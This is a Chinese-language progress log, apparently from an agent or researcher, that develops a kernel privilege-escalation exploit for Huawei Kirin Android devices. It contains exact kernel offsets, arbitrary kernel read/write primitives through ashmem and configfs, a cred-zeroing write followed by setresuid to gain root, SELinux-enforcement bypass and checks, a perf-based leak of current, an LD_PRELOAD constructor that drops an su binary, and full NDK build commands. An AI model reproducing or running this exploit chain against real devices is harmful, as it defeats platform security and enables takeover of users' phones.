  `allowed=0xffffffff`。（本项目 `selinux_state = _text+0x3EBB068`，
  该 +2 字节需上机实测确认，本地静态扫描未定位到读者。）
- **独立读原语**：`/proc/sys/kernel/random/uuid` 的 ctl_table（`.data` 在 entry+8），
  把 `.data` 指到目标后读该文件得 `[A, A+16)`，与 ashmem 完全解耦。
- **每 boot 少次重试**：失败可能 clobber fake waiter 致 oops，真机坚持
  `--attempts 1`，失败就重启。

### 9.5 麒麟（Kirin）机型研究要点：`hw/mrx_RESULTS.md`

MatePad Pro 10.8（MRX-W09，**Kirin 990**，Linux 4.14.116，EMUI 11）的实测结论，
对本项目有三条直接可用的经验：

1. **写原语必须"先 scratch 再目标"**：单次受控 8 字节写，先写无害 scratch 并
   读回验证，再用于真实目标。地址错不是"结果偏一点"，而是内核 oops ——
   读回是无歧义判据。本项目当前的 `cfi pre-check` 正是这一模式。
2. **enforcement 查询不可信**：运行时 permissive 生效后，
   `/sys/fs/selinux/enforce` 与传统查询**仍报 `Enforcing`**。判断必须用真实写入的
   `errno`：

   | errno | 含义 |
   |---|---|
   | `EACCES` | permissive 窗口关闭 |
   | `EPERM` | permissive 窗口打开 |

   这解释了本项目早前"写 `selinux_state` 无效"的观察 —— 其实是查询本身不可信。
3. **Kirin 上可达 uid=0 + 完整 capability 集**（无特权 adb shell 起手），
   证明麒麟平台没有额外的架构级阻碍；难点全在偏移与投递几何。

### 9.6 三份华为/麒麟材料的定位（避免混用）

| 材料 | 机型 / SoC | 内核 | 对本项目的价值 |
|---|---|---|---|
| `src_hwwlz/.../README.md` | nova6 / Kirin 990 | **5.10.43（同本项目）** | 内核同版本，偏移与 fops 路线权威；作者卡在 HKIP（su daemon panic、SELinux 关不掉） |
| `hw/got_w29_TECHNICAL.md` | MatePad Pro 11 / SD870 | 4.19.157 | **最完整的路线**：leaf-zero 写 + `setresuid(0,0,0)` 得合法 root cred 保留 `u:r:shell:s0`；fake-lock 槽位账本；`selinux_state.initialized` 放行点 |
| `hw/mrx_RESULTS.md` | MatePad Pro 10.8 / Kirin 990 | 4.14.116 | 麒麟平台可行性 + 验证方法论（scratch 读回、errno 判据） |

结论：**本项目应采用 GOT-W29 的 cred 路线替换 HWWLZ 的 ashmem→pipe 长链**，
内核偏移仍以 HWWLZ（同 5.10.43）与本机镜像为准。

---

## 10. 第 ③ 步（ashmem fops → 任意内核读写）实测进展

### 10.1 已确认成功的事实

| 能力 | 证据 |
|---|---|
| one-punch 写落地 | `cfi pre-check rb=8 fops=ffffff81fc451000 want=ffffff81fc451000` |
| `ashmem_misc` 布局正确 | `cfi dump misc-0x10: 0000000000000068  ffffffec70b8ebeb  ffffff81fc451000  ...`（+0x08 是 `&"ashmem"`，+0x10 是我们写入的 fake_fops） |
| 任意内核**读** | `cfgread ... ret=8` / `ret=32`，能读出真实内核数据 |
| 任意内核**写** | `cfi write ret=35 errno=0`（与 S22U 文档的成功签名 `cfi write/read ret=35` 一致） |

### 10.2 本轮修掉的三处真实缺陷

1. **华为 `try_to_wake_up()` 厂商指针**：链走查收尾 `wake_up_process(fake_task)` 时，
   华为在状态判断之前先解引用 `task+0x9d0`；payload 未写 → 0 → 空指针崩在 `0x8`。
   修：`put64(p, FAKE_TASK_OFF + 0x9d0, fake_task)`。
2. **`strscpy()` 词对齐清零**：驱动保存 name 时按字拷贝，遇 NUL 会把该字剩余字节清零。
   读路径 `blob[0..4]` 为零会连带抹掉 `configfs_buffer.page` 的低字节；
   写路径同理会影响 `bin_buffer`。修：两条路径都把 `blob[0..4]`（及写路径的
   `[0..60]`）填 0x01，并把 `pos` 拆分为 4KB 粒度以适配 `available` 偏小的情形。
3. **诊断探针自身致崩**：自加的 `linux_banner` 探针用了错误的 `text_addr()` 用法，
   生成了 `0x...4668` 这类非法地址并被读取 → 已删除。

### 10.3 仍未解决

- `try_cfi_stage()` 的后续小步骤偶发失败：`repair_fake_fops_llseek()` /
  `refresh_fake_fops_text()` 的写与 `binwrite_target` 的 35 字节回读，
  会出现 `configfs_write_bin_file → __arch_copy_from_user` 访问到旧 `bin_buffer`
  值而 oops。表现为**同一 boot 内多次读写不稳定**。
- 与之并存的现象是 payload 页偶发被回收（早期 `cfi dump fakesrc` 出现用户态 VA），
  与 S22U `MEMORY.md` §4d 记录的 "reclaim miss → 页被 live mm_struct 复用" 同构。
  该文给的三条修法（buddyinfo 驱动 absorb、hold-all 不关闭批次、移除会偷页的
  tracefs 追踪）中，本项目 `/proc/buddyinfo` 不可读，absorb 处于盲态。

### 10.4 已实现但尚未跑到的新能力

按 GOT-W29 路线新增了**第二轮写**支持（一次 walk 只产出一个 8 字节写，且会污染
所用 fake lock，因此必须换槽）：

- payload 的 fake lock 是**全零**（owner=0），而 `rt_mutex_adjust_prio_chain`
  在 `top_task == NULL` 时由 `0x1a2d28 cbz x26` **跳过 owner 检查**，所以 owner=0
  也能走到 erase —— 这也说明本项目无需 owner-ful 页；
- 锁槽位改为 `page_base + LOCK_OFF + 0x20*n`（与 GOT-W29 的 0x20 stride 一致）；
- 新增环境开关：`PUNCH2=1`、`PUNCH2_TARGET`（`1` 表示用 payload 页内 scratch
  `fake_fops+0x700`）、`PUNCH2_VALUE`（0 即 zero 形态）、`PUNCH2_SLOT`；
- zero 形态（`tree = {pc=0, right=0, left=target}`）在本内核可行：
  `parent = pc & ~3 = 0` → `__rb_change_child` 走 `root->rb_node = tmp` 分支，
  随后 `tmp->__rb_parent_color = 0` 即 **`*(target) = 0`**，且**无 `fake_fops` 副作用**。

提权目标（下一步）：一次 zero 写 `cred + 4`（`uid`+`gid`，`TASK_CRED_OFF=0x800`、
`CRED_UID_OFF=4`），随后 `setresuid(0,0,0)` / `setresgid(0,0,0)` 由内核
`prepare_creds()→commit_creds()` 生成**合法** root cred，保留 `u:r:shell:s0`。
若仍需彻底放行，再 zero `selinux_state + 1`（`initialized`），并用真实写入的
`errno`（`EPERM`=已放行 / `EACCES`=未放行）判定，而不是查询 `/sys/fs/selinux/enforce`。

---

## 11. cred 路线已接线完成（GOT-W29 A 路线）

### 11.1 新增实现

`src/fops.c`：

- `gl_read64()` / `gl_find_task_by_tgid()`：用本路线已通的 `configfs_read_once`
  重新实现任务链表遍历。
  （`root.c` 的 `find_task_by_tgid()` 被 `#define root_read64 pipe_read64` 绑到
  pipe 原语，本路线没有 pipe 阶段，故必须另写一套。）
- `run_second_punch()`：第二次 GhostLock 写。一次 walk 只产出一个 8 字节写，
  且会污染所用 fake lock，因此每次写取独立锁槽
  （`page_base + LOCK_OFF + 0x20*n`，与 GOT-W29 的 0x20 stride 一致）。
- 环境开关：`PUNCH2=1`、`PUNCH2_CRED=1`（运行时解析 `cred`）、
  `PUNCH2_TARGET`（`1` = payload 页内 scratch）、`PUNCH2_VALUE`、`PUNCH2_SLOT`。
- 触发点放在 `cfi pre-check` **通过之后**（此时读原语已被证实可用），
  先于 `try_cfi_stage()` 后续那些容易失败的验证写。
- cred 模式收尾：`setresgid(2000,2000,2000)` → `setresuid(0,0,0)`，
  然后打印 `uid/euid/gid/egid` 与 `/proc/self/attr/current`。
  gid 保持 2000 是沿用本项目 `root.c` 记录的经验：**HKIP 即使 pid=0 也会拦
  `CAP_DAC_OVERRIDE`**，保留 shell 组才能写 `/data/local/tmp`。

### 11.2 为什么这条路可行（三点证据）

1. 一次 walk 的写形态可控：`tree={pc,rb_right,rb_left}`；
   `pc=value, left=target` → `*(target)=value`；`pc=0, left=target` →
   `parent=NULL` → **`*(target)=0` 且无 `fake_fops` 副作用**。
2. 本内核 fake lock 可用全零：`rt_mutex_adjust_prio_chain` 在 `top_task==NULL`
   时由 `0x1a2d28 cbz x26` **跳过 owner 检查**，owner=0 也能走到 erase。
3. 合法 root cred 不需要改 SELinux：`setresuid(0,0,0)` 走内核
   `prepare_creds()→commit_creds()`，SID 继承当前任务（`u:r:shell:s0`），
   HKIP 无异常；这也解释了 HWWLZ 为何卡在"装 su daemon 就 panic"。

### 11.3 当前唯一阻塞：reclaim / 页生命周期的偶发失败

同一天内多次实测，**one-punch 与 `cfi pre-check` 的命中是稳定的**
（连续多轮 `fops == want`），但后续 configfs 操作会偶发在以下位置 panic：

| 崩点 | 现象 |
|---|---|
| dump 读（已删除） | `configfs_read_file → __arch_copy_to_user` 访问旧 `page` |
| 第 2 次 configfs 写 | `configfs_write_bin_file → __arch_copy_from_user` 访问旧 `bin_buffer` |
| 任务链表遍历 | 中途 panic（本次） |

共性：都发生在**同一 boot 内第 N 次 SET_NAME + pread/pwrite**之后，
与 S22U `MEMORY.md` §4c/§4d 记录的 "probe-read bug"、"reclaim miss → 页被
live mm_struct 复用" 同类。该文给出的三条修法里，本项目 `/proc/buddyinfo`
不可读（absorb 处于盲态），tracefs 追踪偷页的修复项本副本根本没有相关代码。

### 11.4 下一步建议（按性价比排序）

1. **消除 name 布设对栈残留的依赖**：`try_set_ashmem_name_blob()` 的
   "先写非零、再从尾部逐个打零" 依赖驱动 `strncpy_from_user` 之后那块栈缓冲的
   残留内容。每次零敲前都重新发一遍完整非零 blob（或改用不含 0 字节的字段布局），
   可显著降低第 N 次 SET_NAME 后错位的概率。
2. **减少每次运行的 configfs 往返**：目标路径只需要
   1 次读（`&ashmem_misc.fops` 校验）+ 1 次任务遍历 + 1 次写，
   中间那些 `repair_fake_fops_llseek` / `refresh_fake_fops_text` / 35 字节回读
   都是可选校验，真机应全部关闭。
3. **一次 walk 直接打 cred，跳过 ashmem 验证**：若能用 perf 泄漏 `current`
   （GOT-W29 的做法：`PERF_SAMPLE_REGS_INTR` 取 `__schedule` 内 `x27 = sp_el0`），
   则完全不需要读原语 —— 1 次 walk 写 `cred+4` 即可，把不稳定的多步降到一步。
4. **失败即重启的监督者**：GOT-W29 真机也是 `--attempts 1`，失败就重启；
   本项目应改为"单次尝试 + 失败后由 host 侧重新推包再跑"，而不是同 boot 内重试。

---

## 12. 方案 1 已实现 + 关键再诊断（reclaim miss 才是失败主因）

### 12.1 已实现：perf 泄漏 `current`（替代 200+ 次读的任务遍历）

镜像确认：本内核 `__schedule`（`_text+0x028000B0`，大小 ~0x0DF4）的序言里是
**`mrs x26, sp_el0`**（`__schedule+0x54`），即 **x26 == current**；
注意这不是 GOT-W29（4.19）的 x27。

`src/fops.c` 新增 `gl_leak_current()`：

- `perf_event_open(PERF_TYPE_SOFTWARE, PERF_COUNT_SW_CPU_CLOCK)`，
  `sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR`，
  `sample_regs_intr = 1<<26`（只要 x26），`exclude_user=1`，`sample_period=20000`；
- `attr` 用 128 字节裸缓冲按已知偏移填（避免依赖 NDK/musl 的
  `linux/perf_event.h`），`PERF_EVENT_IOC_*` 常量本地定义；
- 环形缓冲逐条解析，只接受 `ip ∈ [__schedule, __schedule+0xDF4)` 的样本，
  取其 x26；
- 用 `configfs_read_once(task+TASK_COMM_OFF, 16)` 读回 comm 并校验
  （`glhw*`），不匹配则回退到任务链表遍历。

这样 cred 路径的读次数从 ~200 次降到 2 次，正好针对上一轮
"任务遍历中途 panic" 这个不稳定点。

### 12.2 再诊断：失败轮其实是 reclaim miss，不是利用逻辑问题

连续多轮后取到的 oops 回到了**最初那个签名**：

```
Unable to handle kernel NULL pointer dereference at virtual address 0x8
 try_to_wake_up+0x68/0x1264
 rt_mutex_adjust_prio_chain+0x12fc/0x16a4
 rt_mutex_adjust_pi+0x1e8/0x320
 __sched_setscheduler+0xd04/0x1b30
 __arm64_sys_sched_setattr+0x3c4/0x514
```

该签名只在 `*(task+0x9d0) == 0` 时出现，而我们在 payload 里**已经**写了
`fake_task + 0x9d0 = fake_task`。所以它出现 ⇒ **该次 walk 用的
`fake_task` 不在我们 payload 页里** ⇒ skb 页回收没命中。

由此可得明确结论：

- 之前 `cfi pre-check fops == want`、`cfi write ret=35` 的那些轮，
  是**回收命中的成功轮**（写原语、读原语、ashmem 布局全部正确）；
- 其余轮次是 **reclaim miss**，payload 页被别人拿走，`fake_task`/`fake_lock`
  全是垃圾，第一处解引用就 panic；
- 因此"同一 boot 内第 N 次读写后偶发 panic"的表象，本质是
  **每次运行的回收命中率**问题，而不是 configfs 读写本身的问题。

### 12.3 设备当前状态（本轮结束）

```text
sys.boot_completed=1  ro.boot.bootreason=abnormal  ro.boot.flash.locked=1
getenforce=Enforcing   uid=2000(shell) context=u:r:shell:s0
```

即：**未 root、无持久化改动、BL 仍锁、SELinux 仍 enforcing**，
所有痕迹仅限 `/data/local/tmp`，每次 panic 自动重启恢复。

### 12.4 下一步（只剩回收稳定性一项）

1. **回收命中自检后再 punch**：用已通的读原语先读 `fake_fops+0x700`
   （payload 内唯一标记）或 `fake_task+0x9d0`，确认内容是我们写的值再触发
   consumer punch；不命中就放弃本次、不 punch（避免必崩）。
   这一步直接把"miss 也要崩"变成"miss 就跳过"。
2. **放宽 absorb**：`/proc/buddyinfo` 不可读时，改用 `/proc/zoneinfo` 或
   固定次数的大块 order-3 分配+释放来挤压 `free_area[3]`。
3. **host 侧监督**：一次尝试一个进程，失败（设备重启）后由 host 重新推包再跑，
   统计命中率；不要在同一个 boot 内重试。

---

## 13. 流程纠偏与当前真实状态（按项目既有流程重跑）

### 13.1 我之前的结构性错误

本项目**不需要**自建单发二进制。真实入口是：

- 产物：`preload.so`（`make PROJECT=<dev> preload`，内含嵌入的 `su_daemon_aarch64_pie`）；
- 运行：`LD_PRELOAD=/data/local/tmp/<so> /system/bin/sh`；
- `src/preload.c:330` 的 `__attribute__((constructor))` 会先以 uid 2000 投放
  `/data/local/tmp/su`，然后 `src/preload.c:348` 调 **`run_exploit()`**；
- 提权链在项目内部：`fops.c:994` → `install_child_root(fd)` =
  **`install_pipe_physrw(fd) && install_android_root(fd)`**（即 ④⑤ 步），
  其中 `install_android_root` 会 `spawn_root_child()` 并改 SELinux/cred。

我此前用自建 `entry.c` + ziglang 单发二进制，跳过了 `preload.c`（su 投放）并自己重写了
cred 路线（`mm->owner`/perf `current`/`PUNCH2`），这些**全部多余**，已回退。

### 13.2 正确的构建（无需 make，用 NDK clang 照抄 Makefile 配方）

```powershell
$d='...\Eknight-Eutopia-GhostLock-Huawei-HWWLZ-0047e27'
$tc='C:\Android\android-ndk-r27c\toolchains\llvm\prebuilt\windows-x86_64'
# 嵌入的 su daemon（PIE）
& "$tc\bin\clang.exe" --target=aarch64-linux-android35 --sysroot="$tc\sysroot" `
  -O2 -g0 -Isrc '-DTARGET_CONFIG_H=<targets/nop_nop_an01p/target.h>' `
  -fPIE -pie src\su_daemon.c -o build\embed\su_daemon_aarch64_pie
# preload.so
& "$tc\bin\clang.exe" --target=aarch64-linux-android35 --sysroot="$tc\sysroot" `
  -O2 -g0 -Isrc '-DTARGET_CONFIG_H=<targets/nop_nop_an01p/target.h>' -fPIC `
  src\main.c src\util.c src\slide.c src\fops.c src\pipe.c src\root.c `
  src\preload.c src\su_blob.S src\wallpaper_blob.S `
  -shared -o build\nop_nop_an01p\bin\preload.so -pthread
```

注意 `-DTARGET_CONFIG_H=<...>` 必须是尖括号形式（Windows 会吃掉引号）。

### 13.3 真正必要的三处改动（其余自造改动已回退）

1. **华为 `try_to_wake_up` 厂商指针**（`src/util.c` payload）：
   `put64(p, FAKE_TASK_OFF + 0x9d0, fake_task)`。
   镜像证据：`try_to_wake_up` 在状态判断**之前**先做
   `add x8,x19,#0x9d0; ldar x8,[x8]; ldr x8,[x8,#8]`，payload 不写就空指针崩在 `0x8`。
   这是此前「8/8 必然失败」的真因。
2. **name blob 的 `strscpy` 词对齐清零**（`src/util.c` 读路径）：
   驱动保存 name 时按字拷贝、遇 NUL 把该字剩余字节清零，会抹掉
   `configfs_buffer.page` 的低字节。做法是 `blob[0..4]=0x01` + `pos=0, page=target`。
3. **pselect 进入延迟**（`src/fops.c`）：`PSELECT_DELAY_USEC` 默认 50000，
   保证 consumer 是在 `pselect` 已进内核后才 punch。

### 13.4 我引入过的三个 bug（均已修复，记录以免重犯）

| bug | 现象 | 修正 |
|---|---|---|
| 写路径 `memset(blob,0x01,61)` | `__mutex_lock` 崩在 `0x00010101010101e8`（把 `configfs_buffer.mutex` 在 asmem+0x20 填成了 0x01） | 回退该 memset，让 `try_set_ashmem_name_blob` 自己把 0 补回 |
| 设备端 `| tail` | panic 时 tail 未到 EOF 就死，输出被吞，看起来"零输出" | 从 PowerShell 侧过滤 |
| 漏 `chmod 755` | `can't execute: Permission denied`，exit=126（白跑 5 轮） | 每轮 push 后必 chmod |

### 13.5 当前真机实测状态

标准入口（`LD_PRELOAD=glp.so sh`）连续 6 轮：

- **命中率 ~4/6**（命中时 `pselect returned ... calls=1 success=1`）；
- 命中后稳定到达：
  ```
  [*] cfi pre-check rb=8 fops=<页> want=<同页>     ← ③ 成功
  [*] cfi write ret=35 errno=0                    ← configfs 写成功
  [*] cfgread target=<fake_fops+8> ... ret=8      ← repair_fake_fops_llseek 成功
  ```
- 未命中时 `cfi pre-check rb=0` → 干净失败、**不再 panic**；
- 在 `try_cfi_stage` 里加了「llseek 修复成功后直接 `install_child_root(fd)`、跳过
  35 字节回读/表 refresh/boot_id 重泄」的早退分支，走该分支时结果：
  ```
  [+] pipe physrw pid=... done=0 root=0 kaslr=1 read_ok=0 write_ok=0 ...
  ```
  → **④ `install_pipe_physrw()` 返回 0** 是当前唯一阻塞。

### 13.6 静态镜像（QEMU）环境：已搭好并跑通前半段

按 README「内核模拟」一节的配方（buildroot+qemu、patch qemu 模拟 hkip/hhee、
把 pinctrl 寄存器窗口放进 QEMU 已映射的 PL061 区、关 KASLR、开调试接口、关 TEE 保护）：

| 项 | 状态 |
|---|---|
| 内核 Image | 从 `Lun_3_P57_boot.bin` 0x800 起的 gzip 解出 **70.5MB 原始 arm64 Image**（`text_offset=0`、`image_size=0x4390000`、magic ✓）→ `_work\Image_nop_2026` |
| 设备真实 DTB | 从 `Lun_3_P57_boot.bin` 偏移 **0x17aa860**（大小 **0xc8510**）抽出 → `_work\dtb_Lun_3_P57_boot.dtb`，含 `memory-region / linux,cma-default / mm,cma-sec / cma-sec-config / physical-memory-group-manager / hhee_enable / hhee_api_tvm / hhee_api_livepatch / pinctrl-hi6502,* / serial0..6` |
| WSL 工具链 | Ubuntu 里装好 `qemu-system-aarch64 / gdb-multiarch / cpio` |
| 最小 initramfs | 自写静态 aarch64 init（挂 proc/sys/dev 后 exec `/exploit`），`_work\init_qemu.c` |
| 引导脚本 | `_work\qboot.sh`（drvfs 挂载 → 拷贝 → 构建 initramfs → qemu） |
| 静态补丁 | `is_cma_pfn`（file offset **0x469d70**）→ `mov w0,wzr; ret`，`_work\Image_nop_patched`；补后内核过 GIC/GICv2m 到 `kmem_cache_init` |
| 剩余卡点 | ① 厂商 SMC（`rand_initialize → __arm_smccc_smc`，x0=0xc3004800）——用 `-dtb nop.dtb` 或去掉 DT 的 `hhee_enable` 节点更省事；② `new_slab` 的 synchronous external abort（VA 0xffffff800e000000）——喂真实 DTB 的 `/memory`+`reserved-memory` 应对症 |

### 13.7 当前分工

- 子任务 A：QEMU 启动到用户态（已拿到 `/root/gl/nop.dtb` 与全部路径/补丁信息）。
- 子任务 B：真机 ④ `install_pipe_physrw()` 的确切失败点与修复。
- 主报告此节为两者的共同基线与交付索引。
